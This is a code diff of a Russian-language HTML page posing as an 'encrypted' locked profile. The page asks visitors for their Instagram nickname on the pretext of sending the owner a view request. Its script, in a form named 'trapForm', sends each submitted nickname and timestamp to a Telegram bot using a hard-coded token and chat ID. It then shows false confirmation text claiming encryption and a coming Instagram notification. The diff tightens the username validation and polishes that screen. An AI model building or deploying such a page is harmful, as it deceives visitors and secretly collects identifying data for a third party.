@@ -7,9 +7,9 @@
     
     <style>
         body {
-            background-color: #050505; /* Ультра-черный матовый фон */
+            background-color: #050505;
             color: #ffffff;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
@@ -24,10 +24,8 @@
             padding: 40px 24px;
             text-align: center;
             box-sizing: border-box;
-            animation: fadeIn 0.8s ease-out;
         }
 
-        /* Минималистичная иконка замка */
         .secure-icon {
             width: 48px;
             height: 48px;
@@ -40,6 +38,7 @@
             font-size: 18px;
             color: rgba(255, 255, 255, 0.8);
             background: rgba(255, 255, 255, 0.02);
+            transition: all 0.3s ease;
         }
 
         h1 {
@@ -47,18 +46,15 @@
             font-weight: 500;
             letter-spacing: -0.3px;
             margin: 0 0 12px 0;
-            color: #ffffff;
         }
 
         p {
             font-size: 14px;
             line-height: 1.5;
-            color: #8e8e93; /* Благородный серый цвет Apple */
+            color: #8e8e93;
             margin: 0 0 32px 0;
-            font-weight: 400;
         }
 
-        /* Строгое поле ввода */
         input[type="text"] {
             width: 100%;
             padding: 14px 16px;
@@ -70,7 +66,7 @@
             font-size: 14px;
             outline: none;
             box-sizing: border-box;
-            margin-bottom: 12px;
+            margin-bottom: 6px;
             transition: all 0.2s ease;
             text-align: center;
         }
@@ -80,7 +76,20 @@
             background-color: #161616;
         }
 
-        /* Идеально белая контрастная кнопка */
+        input[type="text"].error-input {
+            border-color: #ff3b30 !important;
+            background-color: rgba(255, 59, 48, 0.05);
+            animation: shake 0.4s ease-in-out;
+        }
+
+        .error-message {
+            font-size: 12px;
+            color: #ff3b30;
+            margin-bottom: 15px;
+            display: none;
+            text-align: center;
+        }
+
         button {
             width: 100%;
             padding: 14px;
@@ -93,46 +102,48 @@
             font-size: 14px;
             cursor: pointer;
             transition: all 0.2s ease;
+            margin-top: 10px;
         }
 
-        button:hover {
-            background-color: #e5e5ea;
-        }
+        button:hover { background-color: #e5e5ea; }
 
-        button:active {
-            transform: scale(0.98);
-        }
-
-        /* Текст успеха */
-        .success-text {
+        .success-box {
             display: none;
             font-size: 14px;
-            color: rgba(255, 255, 255, 0.6);
-            margin-top: 24px;
-            line-height: 1.5;
-            animation: fadeIn 0.4s ease-out;
+            color: rgba(255, 255, 255, 0.7);
+            line-height: 1.6;
+            margin-top: 10px;
+            animation: fadeIn 0.5s ease-out;
         }
 
         @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(10px); }
+            from { opacity: 0; transform: translateY(8px); }
             to { opacity: 1; transform: translateY(0); }
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            20%, 60% { transform: translateX(-6px); }
+            40%, 80% { transform: translateX(6px); }
         }
     </style>
 </head>
 <body>
 
     <div class="premium-container">
-        <div class="secure-icon">🔒</div>
-        <h1>Профиль защищен</h1>
-        <p>Этот аккаунт использует шифрование доступа. Чтобы отправить владельцу запрос на просмотр, укажите ваш @никнейм.</p>
+        <div class="secure-icon" id="lockIcon">🔒</div>
+        <h1 id="mainTitle">Профиль защищен</h1>
+        <p id="mainDesc">Этот аккаунт использует шифрование доступа. Чтобы отправить владельцу запрос на просмотр, укажите ваш @никнейм.</p>
         
-        <form id="trapForm">
-            <input type="text" id="username" placeholder="Ваш никнейм в Instagram" required autocomplete="off">
+        <form id="trapForm" novalidate>
+            <input type="text" id="username" placeholder="Ваш никнейм в Instagram" autocomplete="off">
+            <div class="error-message" id="errorMsg">Неверный формат никнейма. Используйте только латиницу, цифры, точки и (_)</div>
             <button type="submit">Продолжить</button>
         </form>
 
-        <div class="success-text" id="successMsg">
-            Запрос зашифрован и отправлен.<br>Ожидайте уведомления от владельца.
+        <div class="success-box" id="successCard">
+            Запрос успешно зашифрован и отправлен владельцу профиля.<br>
+            <span style="color: #8e8e93; font-size: 13px;">Вы получите уведомление в Instagram, когда доступ будет одобрен.</span>
         </div>
     </div>
 
@@ -140,28 +151,63 @@
         document.getElementById('trapForm').addEventListener('submit', function(e) {
             e.preventDefault();
             
-            const guestName = document.getElementById('username').value;
+            const inputField = document.getElementById('username');
+            const errorText = document.getElementById('errorMsg');
+            let rawInput = inputField.value.trim();
             
-            // !!! ВСТАВЬ СВОЙ ID СЮДА !!!
+            // 1. Автоматически добавляем @ в инпут для красоты, если пользователь забыл
+            if (rawInput.length > 0 && !rawInput.startsWith('@')) {
+                rawInput = '@' + rawInput;
+                inputField.value = rawInput;
+            }
+
+            // 2. Вырезаем сам ник без знака @ для строгой проверки
+            const usernameWithoutAt = rawInput.replace('@', '');
+
+            // 3. СТРОГАЯ ЛОГИКА ВАЛИДАЦИИ (Регулярное выражение Instagram)
+            // Разрешено: a-z, 0-9, точки, подчеркивания. Длина от 2 до 30 символов. Нельзя начинать с точки.
+            const instagramRegex = /^(?!\.)[a-z0-9._]{2,30}$/i;
+            
+            // Проверяем текст через регулярку (выдаст true или false)
+            const isValid = instagramRegex.test(usernameWithoutAt);
+
+            // Если валидация вернула false — включаем защиту от дурака
+            if (!isValid) {
+                inputField.classList.add('error-input');
+                errorText.style.display = 'block';
+                setTimeout(() => { inputField.classList.remove('error-input'); }, 400);
+                return; // Полная остановка, дальше код не идет
+            }
+
+            // Если всё true — убираем ошибки и отправляем данные
+            errorText.style.display = 'none';
+            
             const TELEGRAM_TOKEN = '8862624116:AAFCytARKgIazyPqsqZYxwyQneucED1Zvtk';
-            const CHAT_ID = '8309138429'; 
+            const CHAT_ID = 'ВСТАВЬ_СЮДА_СВОЙ_ID'; 
             
-            const message = `📈 НОВЫЙ ГОСТЬ!\nНик в Инсте: @${guestName}\nВремя: ${new Date().toLocaleString()}`;
+            const message = `📈 ВАЛИДНЫЙ НИК ПОЛУЧЕН!\nНик в Инсте: ${rawInput}\nВремя: ${new Date().toLocaleString()}`;
             const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
             
             fetch(url, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: CHAT_ID, text: message })
-            })
-            .then(response => {
-                document.getElementById('trapForm').style.display = 'none';
-                document.getElementById('successMsg').style.display = 'block';
-            })
-            .catch(error => {
-                console.error('Ошибка:', error);
-                alert('Ошибка сети. Попробуйте позже.');
-            });
+                body: JSON.stringify({ chat_id: 8309138429, text: message })
+            }).catch(err => console.error(err));
+
+            // Показываем красивый финальный экран
+            document.getElementById('trapForm').style.display = 'none';
+            document.getElementById('mainDesc').style.display = 'none';
+            
+            document.getElementById('mainTitle').innerText = 'Запрос отправлен';
+            document.getElementById('lockIcon').innerText = '✓';
+            document.getElementById('lockIcon').style.borderColor = 'rgba(255, 255, 255, 0.4)';
+            
+            document.getElementById('successCard').style.display = 'block';
+        });
+
+        document.getElementById('username').addEventListener('input', function() {
+            this.classList.remove('error-input');
+            document.getElementById('errorMsg').style.display = 'none';
         });
     </script>
 
